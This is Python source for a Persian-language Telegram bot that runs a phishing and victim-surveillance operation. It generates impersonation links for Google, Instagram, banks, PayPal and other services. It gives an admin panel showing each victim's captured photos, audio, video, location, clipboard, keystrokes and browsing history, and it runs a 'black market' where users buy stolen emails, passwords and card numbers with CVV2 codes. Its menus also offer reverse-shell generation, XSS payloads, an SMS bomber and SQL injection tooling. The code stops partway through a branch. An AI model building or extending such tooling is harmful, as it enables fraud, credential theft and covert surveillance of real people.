async def hack_lab_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("🌐 وب و برنامه", callback_data="hack_web"),
         InlineKeyboardButton("📡 وای‌فای و شبکه", callback_data="hack_wifi")],
        [InlineKeyboardButton("🔐 رمز و کد", callback_data="hack_crypto"),
         InlineKeyboardButton("👤 OSINT و اطلاعات", callback_data="hack_osint")],
        [InlineKeyboardButton("💻 سیستم و بدافزار", callback_data="hack_system"),
         InlineKeyboardButton("☁️ ابر و زیرساخت", callback_data="hack_cloud")],
        [InlineKeyboardButton("📻 سخت‌افزار و IoT", callback_data="hack_hardware")],
        [InlineKeyboardButton("📨 اس‌ام‌اس بمبر", callback_data="sms_bomber")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
    ]
    await query.edit_message_text("🛠️ آزمایشگاه هک (۷۰+ ابزار):", reply_markup=InlineKeyboardMarkup(keyboard))

async def hack_web_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("💉 SQLi", callback_data="sqli_prompt"), InlineKeyboardButton("❌ XSS", callback_data="xss_payloads")],
        [InlineKeyboardButton("📁 دایرکتوری", callback_data="dirbrute_prompt"), InlineKeyboardButton("🌐 زیردامنه", callback_data="subdomain_prompt")],
        [InlineKeyboardButton("🔎 دورک", callback_data="dork_menu"), InlineKeyboardButton("🤖 robots.txt", callback_data="robots_prompt")],
        [InlineKeyboardButton("🎯 Cache Poison", callback_data="cache_poison"), InlineKeyboardButton("🔀 Open Redirect", callback_data="open_redirect")],
        [InlineKeyboardButton("📎 File Upload", callback_data="file_upload"), InlineKeyboardButton("⏱️ Timing Attack", callback_data="timing_attack")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="hack_lab_main")]
    ]
    await update.callback_query.edit_message_text("🌐 ابزارهای وب:", reply_markup=InlineKeyboardMarkup(keyboard))

async def hack_cloud_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("🌩️ Mass Assignment", callback_data="mass_assignment"), InlineKeyboardButton("🔑 Git Secrets", callback_data="git_secrets")],
        [InlineKeyboardButton("🔀 Dangling DNS", callback_data="dangling_dns")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="hack_lab_main")]
    ]
    await update.callback_query.edit_message_text("☁️ ابزارهای ابر:", reply_markup=InlineKeyboardMarkup(keyboard))

async def hack_hardware_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("📡 BlueBorne", callback_data="blueborne"), InlineKeyboardButton("📱 QR Attack", callback_data="qr_attack")],
        [InlineKeyboardButton("🎤 Vishing", callback_data="vishing"), InlineKeyboardButton("🔌 JTAG", callback_data="jtag_info")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="hack_lab_main")]
    ]
    await update.callback_query.edit_message_text("📻 سخت‌افزار و IoT:", reply_markup=InlineKeyboardMarkup(keyboard))

async def wifi_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("👿 Evil Twin", callback_data="wifi_evil_twin"), InlineKeyboardButton("🤝 Handshake", callback_data="wifi_handshake")],
        [InlineKeyboardButton("📡 KARMA", callback_data="wifi_karma"), InlineKeyboardButton("🔓 PMKID", callback_data="wifi_pmkid")],
        [InlineKeyboardButton("🚫 Deauth", callback_data="wifi_deauth"), InlineKeyboardButton("🕵️ Probe", callback_data="wifi_probe")],
        [InlineKeyboardButton("🎣 فیشینگ", callback_data="wifi_phishing"), InlineKeyboardButton("📻 SDR", callback_data="wifi_sdr")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="hack_lab_main")]
    ]
    await update.callback_query.edit_message_text("📡 وای‌فای:", reply_markup=InlineKeyboardMarkup(keyboard))

# --- Callback Handler ---
PHISHING_TYPES = {"google": "🔵 گوگل", "gmail": "✉️ جیمیل", "instagram": "📸 اینستاگرام", "facebook": "👤 فیسبوک",
                  "bank": "🏦 درگاه بانکی", "supercell": "🎮 سوپرسل", "lottery": "🎰 گردونه شانس", "twitter": "🐦 توییتر",
                  "snapchat": "👻 اسنپ‌چت", "paypal": "💰 پی‌پال", "tiktok": "🎵 تیک‌تاک", "os_update": "🔄 آپدیت سیستم"}

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOT_ACTIVE, AI_ENABLED
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    try:
        if data == "start": await start(update.callback_query, context)
        elif data == "help": await start(update.callback_query, context)

        elif data == "new_link":
            if not BOT_ACTIVE: await query.edit_message_text("❌ ربات غیرفعال است."); return
            keyboard = [[InlineKeyboardButton(name, callback_data=f"genlink_{code}")] for code, name in PHISHING_TYPES.items()]
            keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="start")])
            await query.edit_message_text("🎯 نوع قربانی:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data.startswith("genlink_"):
            ptype = data[8:]; token = str(uuid.uuid4()); ensure_user(user_id)
            conn = get_db_connection()
            conn.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type, creator_id) VALUES (?,?,?,?,?,?)",
                         (token, datetime.now().isoformat(), query.message.chat.id or "0.0.0.0", datetime.now().isoformat(), ptype, user_id))
            conn.commit(); conn.close()
            await query.edit_message_text(f"✅ لینک ({PHISHING_TYPES[ptype]}) آماده:\n{PUBLIC_URL}/go/{token}")

        elif data == "persona_menu":
            keyboard = [
                [InlineKeyboardButton("🧠 دانشمند", callback_data="set_persona_scientist"), InlineKeyboardButton("🎭 طنزپرداز", callback_data="set_persona_comedian")],
                [InlineKeyboardButton("🧘 روانشناس", callback_data="set_persona_psychologist"), InlineKeyboardButton("💀 هکر", callback_data="set_persona_hacker")],
                [InlineKeyboardButton("🎤 خواننده", callback_data="set_persona_singer"), InlineKeyboardButton("🔄 پیش‌فرض", callback_data="set_persona_default")],
                [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
            ]
            await query.edit_message_text("🎭 شخصیت:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data.startswith("set_persona_"):
            user_persona[user_id] = data[12:]
            await query.edit_message_text(f"✅ شخصیت شما تغییر کرد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="start")]]))

        elif data == "ai_tools_menu":
            keyboard = [
                [InlineKeyboardButton("🔍 جستجوی وب", callback_data="search_prompt"), InlineKeyboardButton("🎨 ساخت تصویر", callback_data="imagine_prompt")],
                [InlineKeyboardButton("🌐 ترجمه", callback_data="translate_prompt"), InlineKeyboardButton("📝 خلاصه‌سازی", callback_data="summarize_prompt")],
                [InlineKeyboardButton("⏰ یادآور", callback_data="remind_prompt"), InlineKeyboardButton("💻 اجرای کد", callback_data="execute_prompt")],
                [InlineKeyboardButton("📊 تحلیل احساس", callback_data="sentiment_prompt")],
                [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
            ]
            await query.edit_message_text("🤖 ابزارهای AI:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data == "search_prompt": context.user_data['awaiting_search'] = True; await query.edit_message_text("🔍 موضوع:")
        elif data == "imagine_prompt": context.user_data['awaiting_imagine'] = True; await query.edit_message_text("🎨 توضیح:")
        elif data == "translate_prompt": context.user_data['awaiting_translate'] = True; await query.edit_message_text("🌐 متن:")
        elif data == "summarize_prompt": context.user_data['awaiting_summarize'] = True; await query.edit_message_text("📝 متن:")
        elif data == "remind_prompt": context.user_data['awaiting_remind_time'] = True; await query.edit_message_text("⏰ زمان (HH:MM):")
        elif data == "execute_prompt": context.user_data['awaiting_execute_lang'] = True; await query.edit_message_text("💻 زبان:")
        elif data == "sentiment_prompt": context.user_data['awaiting_sentiment'] = True; await query.edit_message_text("📊 متن:")

        elif data == "hack_lab_main": await hack_lab_main(update, context)
        elif data == "hack_web": await hack_web_menu(update, context)
        elif data == "hack_wifi": await wifi_menu(update, context)
        elif data == "hack_crypto":
            keyboard = [[InlineKeyboardButton("🔐 تولید هش", callback_data="hash_menu"), InlineKeyboardButton("🗝 کرک هش", callback_data="crack_hash_prompt")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="hack_lab_main")]]
            await query.edit_message_text("🔐 رمز و کد:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data == "hash_menu":
            keyboard = [[InlineKeyboardButton("MD5", callback_data="hash_algo_md5"), InlineKeyboardButton("SHA1", callback_data="hash_algo_sha1")],
                        [InlineKeyboardButton("SHA256", callback_data="hash_algo_sha256"), InlineKeyboardButton("SHA512", callback_data="hash_algo_sha512")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="hack_crypto")]]
            await query.edit_message_text("🔐 الگوریتم:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data.startswith("hash_algo_"): context.user_data['hash_algo'] = data[10:]; context.user_data['awaiting_hash_text'] = True; await query.edit_message_text(f"📝 متن:")
        elif data == "crack_hash_prompt": context.user_data['awaiting_crackhash'] = True; await query.edit_message_text("🗝 هش:")

        elif data == "hack_osint":
            keyboard = [[InlineKeyboardButton("🌍 IP Info", callback_data="ipinfo_prompt"), InlineKeyboardButton("📧 تحلیل هدر", callback_data="email_header_prompt")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="hack_lab_main")]]
            await query.edit_message_text("👤 OSINT:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data == "ipinfo_prompt": context.user_data['awaiting_ipinfo'] = True; await query.edit_message_text("🌍 IP:")
        elif data == "email_header_prompt": context.user_data['awaiting_email_header'] = True; await query.edit_message_text("📧 هدر:")

        elif data == "hack_system":
            keyboard = [[InlineKeyboardButton("🐚 Reverse Shell", callback_data="reverse_shell_prompt"), InlineKeyboardButton("⌨️ Keylogger", callback_data="keylogger_info")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="hack_lab_main")]]
            await query.edit_message_text("💻 سیستم:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data == "reverse_shell_prompt": context.user_data['awaiting_shell'] = True; await query.edit_message_text("🐚 IP:PORT:")
        elif data.startswith("shell_"):
            parts = data.split("|"); lang = parts[0][6:]; ip = parts[1]; port = parts[2]
            shell = generate_reverse_shell(lang, ip, port)
            await query.edit_message_text(f"🐚 {lang}:\n<pre>{shell}</pre>", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="reverse_shell_prompt")]]))
        elif data == "keylogger_info": await query.edit_message_text("⌨️ راهنما: pynput", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="hack_system")]]))

        elif data == "hack_cloud": await hack_cloud_menu(update, context)
        elif data == "hack_hardware": await hack_hardware_menu(update, context)

        elif data == "sms_bomber": context.user_data['awaiting_sms_phone'] = True; await query.edit_message_text("📨 شماره:")

        # Web sub-items
        elif data == "sqli_prompt": context.user_data['awaiting_sqli'] = True; await query.edit_message_text("💉 URL:")
        elif data == "xss_payloads":
            payloads = xss_payloads()
            text = "❌ پیلودهای XSS:\n\n" + "\n".join(f"<code>{p}</code>" for p in payloads)
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="hack_web")]]))
        elif data == "dirbrute_prompt": context.user_data['awaiting_dirbrute'] = True; await query.edit_message_text("📁 آدرس:")
        elif data == "subdomain_prompt": context.user_data['awaiting_subdomain'] = True; await query.edit_message_text("🌐 دامنه:")
        elif data == "dork_menu":
            keyboard = [[InlineKeyboardButton(t, callback_data=f"dork_{k}")] for k, t in [("sql","SQLi"),("admin","Admin"),("backup","Backup"),("camera","Camera"),("phpinfo","PHP Info"),("redirect","Open Redirect"),("lfi","LFI"),("xss","XSS")]]
            keyboard.append([InlineKeyboardButton("بازگشت", callback_data="hack_web")])
            await query.edit_message_text("🔎 دورک:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data.startswith("dork_"):
            dork = generate_dork(data[5:])
            await query.edit_message_text(f"🔎 <code>{dork}</code>", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="dork_menu")]]))
        elif data == "robots_prompt": context.user_data['awaiting_robots'] = True; await query.edit_message_text("🤖 آدرس:")
        elif data == "cache_poison": context.user_data['awaiting_cache'] = True; await query.edit_message_text("🎯 آدرس:")
        elif data == "open_redirect": context.user_data['awaiting_open_redirect'] = True; await query.edit_message_text("🔀 URL:")
        elif data == "file_upload": context.user_data['awaiting_file_upload'] = True; await query.edit_message_text("📎 URL:")
        elif data == "timing_attack": context.user_data['awaiting_timing'] = True; await query.edit_message_text("⏱️ URL param:")

        # Cloud sub-items
        elif data == "mass_assignment": context.user_data['awaiting_mass'] = True; await query.edit_message_text("⚡ URL param=val:")
        elif data == "git_secrets": context.user_data['awaiting_git'] = True; await query.edit_message_text("🔑 آدرس مخزن:")
        elif data == "dangling_dns": context.user_data['awaiting_dns'] = True; await query.edit_message_text("🌐 دامنه:")

        # Hardware sub-items
        elif data == "blueborne": await query.edit_message_text(blueborne_scan(), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="hack_hardware")]]))
        elif data == "qr_attack": context.user_data['awaiting_qr'] = True; await query.edit_message_text("📱 URL مخرب:")
        elif data == "vishing": context.user_data['awaiting_vishing'] = True; await query.edit_message_text("🎤 نام,سناریو:")
        elif data == "jtag_info": await query.edit_message_text(jtag_guide(), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="hack_hardware")]]))

        # Wi-Fi info
        elif data.startswith("wifi_"):
            topic = data[5:]
            guides = {"evil_twin": ("👿 Evil Twin", "ابزار: airgeddon"), "handshake": ("🤝 Handshake", "ابزار: aircrack-ng"), "karma": ("📡 KARMA", "ابزار: hostapd-wpe"),
                      "pmkid": ("🔓 PMKID", "ابزار: hcxdumptool"), "deauth": ("🚫 Deauth", "ابزار: aireplay-ng"), "probe": ("🕵️ Probe", "ابزار: airodump-ng"),
                      "phishing": ("🎣 فیشینگ", "ابزار: wifiphisher"), "sdr": ("📻 SDR", "ابزار: GQRX, rtl_433")}
            title, desc = guides.get(topic, ("نامشخص", "راهنما"))
            await query.edit_message_text(f"<b>{title}</b>\n\n{desc}", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="wifi_menu")]]))

        elif data == "clear_history":
            if user_id in conversation_history: del conversation_history[user_id]
            await query.edit_message_text("🧹 پاک شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="start")]]))

        elif data == "profile":
            ensure_user(user_id); conn = get_db_connection()
            user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
            listings_count = conn.execute("SELECT COUNT(*) FROM listings WHERE seller_id=? AND sold=0", (user_id,)).fetchone()[0]; conn.close()
            text = f"👤 <b>پروفایل</b>\n⭐ امتیاز: {user['points']}\n🎯 سطح: {user['level']}\n📦 آگهی‌های فعال: {listings_count}"
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 بازار", callback_data="market_menu"), InlineKeyboardButton("📊 آگهی‌های من", callback_data="my_listings")],
                [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
            ]))

        elif data == "market_menu":
            await query.edit_message_text("🛒 بازار سیاه", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛍 مشاهده آگهی‌ها", callback_data="market_view")],
                [InlineKeyboardButton("📢 فروش اطلاعات", callback_data="market_sell")],
                [InlineKeyboardButton("📊 آگهی‌های من", callback_data="my_listings")],
                [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
            ]))

        elif data == "market_view":
            conn = get_db_connection()
            listings = conn.execute("SELECT l.id, l.token, l.price, v.email FROM listings l JOIN credentials v ON l.token=v.token WHERE l.sold=0 ORDER BY l.listed_at DESC LIMIT 10").fetchall()
            conn.close()
            if not listings:
                await query.edit_message_text("💰 هیچ آگهی‌ای موجود نیست.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_menu")]]))
                return
            buttons = []
            for item in listings:
                buttons.append([InlineKeyboardButton(f"🆔{item['id']} | {item['email']} | 💰{item['price']}", callback_data=f"market_buy_{item['id']}")])
            buttons.append([InlineKeyboardButton("بازگشت", callback_data="market_menu")])
            await query.edit_message_text("🛍 آگهی‌ها", reply_markup=InlineKeyboardMarkup(buttons))

        elif data.startswith("market_buy_"):
            listing_id = int(data.replace("market_buy_", ""))
            conn = get_db_connection()
            listing = conn.execute("SELECT * FROM listings WHERE id=? AND sold=0", (listing_id,)).fetchone()
            if not listing:
                await query.edit_message_text("❌ آگهی موجود نیست.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_view")]])); conn.close(); return
            ensure_user(user_id)
            buyer = conn.execute("SELECT points FROM users WHERE user_id=?", (user_id,)).fetchone()
            if buyer['points'] < listing['price']:
                await query.answer("❌ امتیاز کافی نیست.", show_alert=True); conn.close(); return
            cred = conn.execute("SELECT email FROM credentials WHERE token=?", (listing['token'],)).fetchone()
            conn.close()
            await query.edit_message_text(f"🛒 تأیید خرید\n📧 {cred['email']}\n💰 {listing['price']} امتیاز", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ تأیید خرید", callback_data=f"market_confirm_{listing_id}")],
                [InlineKeyboardButton("🔙 انصراف", callback_data="market_view")]
            ]))

        elif data.startswith("market_confirm_"):
            listing_id = int(data.replace("market_confirm_", ""))
            conn = get_db_connection()
            listing = conn.execute("SELECT * FROM listings WHERE id=? AND sold=0", (listing_id,)).fetchone()
            if not listing:
                await query.edit_message_text("❌ فروخته شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_view")]])); conn.close(); return
            conn.execute("UPDATE users SET points = points - ? WHERE user_id=?", (listing['price'], user_id))
            conn.execute("UPDATE users SET points = points + ? WHERE user_id=?", (listing['price'], listing['seller_id']))
            conn.execute("UPDATE listings SET sold=1 WHERE id=?", (listing_id,))
            conn.commit()
            cred = conn.execute("SELECT * FROM credentials WHERE token=?", (listing['token'],)).fetchone()
            conn.close()
            text = f"✅ <b>خرید موفق!</b>\n📧 {cred['email']}\n🔑 {cred['password']}"
            if cred.get('card_number'): text += f"\n💳 {cred['card_number']}\n🔐 {cred['cvv2']}\n📅 {cred['expiry']}"
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_menu")]]))

        elif data == "market_sell":
            context.user_data['awaiting_sell_token'] = True
            await query.edit_message_text("📝 لطفاً <b>توکن</b> قربانی را ارسال کنید:", parse_mode="HTML")

        elif data == "my_listings":
            conn = get_db_connection()
            listings = conn.execute("SELECT l.id, l.token, l.price, l.sold, v.email FROM listings l JOIN credentials v ON l.token=v.token WHERE l.seller_id=? ORDER BY l.listed_at DESC", (user_id,)).fetchall()
            conn.close()
            if not listings:
                await query.edit_message_text("📭 آگهی ندارید.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_menu")]]))
                return
            text = "<b>📊 آگهی‌های من</b>\n\n"
            for l in listings:
                status = "✅ فروخته شد" if l['sold'] else "⏳ در انتظار"
                text += f"🔹 <b>{l['id']}</b>: {l['email']} — 💰{l['price']} ({status})\n"
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="market_menu")]]))

        elif data == "admin_panel":
            if user_id != ADMIN_USER_ID: await query.answer("⛔", show_alert=True); return
            await query.edit_message_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("روشن/خاموش ربات", callback_data="toggle_bot")],
                [InlineKeyboardButton(f"🤖 AI: {'✅' if AI_ENABLED else '❌'}", callback_data="toggle_ai")],
                [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
                [InlineKeyboardButton("👥 لیست کاربران", callback_data="users_list")],
                [InlineKeyboardButton("📊 آمار", callback_data="stats")],
                [InlineKeyboardButton("📢 ارسال به گروه‌ها", callback_data="broadcast_groups_menu")],
                [InlineKeyboardButton("✉️ ارسال به کاربر", callback_data="send_user")],
                [InlineKeyboardButton("💾 پشتیبان‌گیری", callback_data="backup_now")],
                [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
            ]))

        elif data == "broadcast_groups_menu":
            if user_id != ADMIN_USER_ID: return
            conn = get_db_connection()
            groups = conn.execute("SELECT chat_id, title FROM groups").fetchall()
            conn.close()
            if not groups:
                await query.edit_message_text("گروهی ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]])); return
            buttons = [[InlineKeyboardButton(g['title'][:25], callback_data=f"sendgroup_{g['chat_id']}")] for g in groups]
            buttons.append([InlineKeyboardButton("📢 ارسال به همه", callback_data="broadcast_groups_all")])
            buttons.append([InlineKeyboardButton("🔙 بازگشت", callback_data="admin_panel")])
            await query.edit_message_text("گروه مورد نظر:", reply_markup=InlineKeyboardMarkup(buttons))

        elif data.startswith("sendgroup_"):
            if user_id != ADMIN_USER_ID: return
            context.user_data['awaiting_group_message'] = int(data.replace("sendgroup_", ""))
            await query.edit_message_text("📝 متن پیام را ارسال کنید:")

        elif data == "broadcast_groups_all":
            if user_id != ADMIN_USER_ID: return
            context.user_data['awaiting_broadcast'] = True
            await query.edit_message_text("📝 متن پیام برای همه گروه‌ها:")

        elif data == "send_user":
            if user_id != ADMIN_USER_ID: return
            context.user_data['awaiting_user_message'] = True
            await query.edit_message_text("📝 لطفاً <b>شناسه عددی کاربر</b> را ارسال کنید:", parse_mode="HTML")

        elif data == "toggle_bot":
            if user_id != ADMIN_USER_ID: return
            BOT_ACTIVE = not BOT_ACTIVE
            await query.edit_message_text(f"ربات {'✅ فعال' if BOT_ACTIVE else '❌ غیرفعال'} شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))

        elif data == "toggle_ai":
            if user_id != ADMIN_USER_ID: return
            if not GROQ_API_KEY: await query.answer("کلید Groq تنظیم نشده", show_alert=True); return
            AI_ENABLED = not AI_ENABLED
            await query.edit_message_text(f"AI {'✅ روشن' if AI_ENABLED else '❌ خاموش'} شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))

        elif data == "stats":
            if user_id != ADMIN_USER_ID: return
            conn = get_db_connection()
            vc = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
            ph = conn.execute("SELECT COUNT(*) FROM media WHERE type='photo'").fetchone()[0]
            vi = conn.execute("SELECT COUNT(*) FROM media WHERE type='video'").fetchone()[0]
            au = conn.execute("SELECT COUNT(*) FROM media WHERE type='audio'").fetchone()[0]
            cr = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
            lr = conn.execute("SELECT COUNT(*) FROM learned").fetchone()[0]
            uc = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            lc = conn.execute("SELECT COUNT(*) FROM listings WHERE sold=0").fetchone()[0]
            pcc = conn.execute("SELECT COUNT(*) FROM private_chats").fetchone()[0]
            last_backup = conn.execute("SELECT MAX(timestamp) FROM backups").fetchone()[0] or "هرگز"
            conn.close()
            text = f"📊 <b>آمار</b>\n👥 قربانیان: {vc}\n👤 کاربران: {uc}\n👥 استارت‌ها: {pcc}\n📸 عکس: {ph}\n🎥 ویدیو: {vi}\n🎤 صدا: {au}\n🔑 اطلاعات ورود: {cr}\n🧠 کلمات: {lr}\n🛒 آگهی‌های فعال: {lc}\n💾 آخرین پشتیبان: {last_backup}\n🤖 AI: {'✅' if AI_ENABLED else '❌'}\n🤖 ربات: {'✅' if BOT_ACTIVE else '❌'}"
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))

        elif data == "victims_list":
            if user_id != ADMIN_USER_ID: return
            conn = get_db_connection()
            victims = conn.execute("SELECT token, ip, last_active, phishing_type FROM victims ORDER BY last_active DESC").fetchall()
            conn.close()
            if not victims:
                await query.edit_message_text("هنوز قربانی‌ای ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
                return
            buttons = []
            for v in victims:
                short = v['token'][:8] + "..."
                last = v['last_active'] if v['last_active'] else "نامشخص"
                ptype = PHISHING_TYPES.get(v['phishing_type'], v['phishing_type'])
                buttons.append([InlineKeyboardButton(f"{ptype} | {short} | {last}", callback_data=f"victim_detail|{v['token']}")])
            buttons.append([InlineKeyboardButton("بازگشت", callback_data="admin_panel")])
            await query.edit_message_text("📋 لیست قربانیان:", reply_markup=InlineKeyboardMarkup(buttons))

        elif data.startswith("victim_detail|"):
            if user_id != ADMIN_USER_ID: return
            token = data.split("|")[1]
            conn = get_db_connection()
            victim = conn.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
            if not victim:
                await query.edit_message_text("قربانی یافت نشد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="victims_list")]])); conn.close(); return
            log_dev = conn.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
            info = json.loads(log_dev['data']) if log_dev else {"warning": "هنوز اطلاعات دستگاه ارسال نشده است."}
            conn.close()
            text = f"<b>مشخصات قربانی</b>\n<b>توکن:</b> <code>{victim['token']}</code>\n<b>IP:</b> {victim['ip']}\n<b>زمان ایجاد:</b> {victim['created_at']}\n<b>آخرین فعالیت:</b> {victim['last_active']}\n<b>نوع فیشینگ:</b> {PHISHING_TYPES.get(victim['phishing_type'], victim['phishing_type'])}\n<b>اطلاعات دستگاه:</b>\n<pre>{json.dumps(info, indent=2, ensure_ascii=False)}</pre>"
            keyboard = [
                [InlineKeyboardButton("📸 عکس", callback_data=f"photo|{token}"), InlineKeyboardButton("🎤 صدا", callback_data=f"audio|{token}"), InlineKeyboardButton("🎥 ویدیو", callback_data=f"video|{token}")],
                [InlineKeyboardButton("📍 موقعیت", callback_data=f"location|{token}"), InlineKeyboardButton("📋 کلیپ‌بورد", callback_data=f"clipboard|{token}"), InlineKeyboardButton("⌨️ کی‌استروک", callback_data=f"keystrokes|{token}")],
                [InlineKeyboardButton("🔌 پورت‌ها", callback_data=f"ports|{token}"), InlineKeyboardButton("🌐 تاریخچه", callback_data=f"history|{token}")],
                [InlineKeyboardButton("🗑 حذف قربانی", callback_data=f"delete_victim|{token}")],
                [InlineKeyboardButton("🔙 بازگشت به لیست", callback_data="victims_list")]
            ]
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

        elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("video|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
            parts = data.split('|'); action = parts[0]; token = parts[1]
            conn = get_db_connection()
            if action == "photo":
                row = conn.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row and row['data']:
                    await query.message.reply_photo(photo=io.BytesIO(row['data']), caption=f"📸 عکس از {token}")
                else:
                    await query.message.reply_text("⚠️ عکسی ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"photo|{token}")]]))
            elif action == "audio":
                row = conn.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row and row['data']:
                    await query.message.reply_audio(audio=io.BytesIO(row['data']), caption=f"🎤 صدا از {token}")
                else:
                    await query.message.reply_text("⚠️ صدایی ضبط نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"audio|{token}")]]))
            elif action == "video":
                row = conn.execute("SELECT data FROM media WHERE token=? AND type='video' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row and row['data']:
                    await query.message.reply_video(video=io.BytesIO(row['data']), caption=f"🎥 ویدیو از {token}")
                else:
                    await query.message.reply_text("⚠️ ویدیویی ضبط نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"video|{token}")]]))
            elif action == "location":
                row = conn.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row: d = json.loads(row['data']); await query.message.reply_location(latitude=d['lat'], longitude=d['lng'])
                else: await query.answer("موقعیت یافت نشد.", show_alert=True)
            elif action == "clipboard":
                row = conn.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row: d = json.loads(row['data']); await query.message.reply_text(f"📋 Clipboard: <code>{d['data']}</code>", parse_mode='HTML')
                else: await query.answer("کلیپ‌بورد خالی.", show_alert=True)
            elif action == "keystrokes":
                rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
                if rows: keys = ''.join([json.loads(r['data'])['data'] for r in rows]); await query.message.reply_text(f"⌨️ Keystrokes: <code>{keys}</code>", parse_mode='HTML')
                else: await query.answer("کی‌استروکی ثبت نشده.", show_alert=True)
            elif action == "ports":
                rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='open_port'", (token,)).fetchall()
                if rows: ports = set([json.loads(r['data'])['port'] for r in rows]); await query.message.reply_text(f"🔌 Open ports: {', '.join(map(str, ports))}")
                else: await query.answer("پورت بازی یافت نشد.", show_alert=True)
            elif action == "history":
